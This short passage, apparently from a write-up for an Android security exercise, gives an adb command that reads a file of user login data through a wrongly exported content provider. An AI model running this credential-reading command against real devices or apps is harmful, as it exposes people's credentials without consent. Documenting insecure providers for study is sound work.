To read the users login data from the wrongfully exported content provider via terminal, simply run

``
adb shell content read --uri content://com.dkronig.root.CustomContentProvider/login_data_readable.txt
``

in a terminal with adb installed, and the content provider will provide you with the sensitive user credentials.
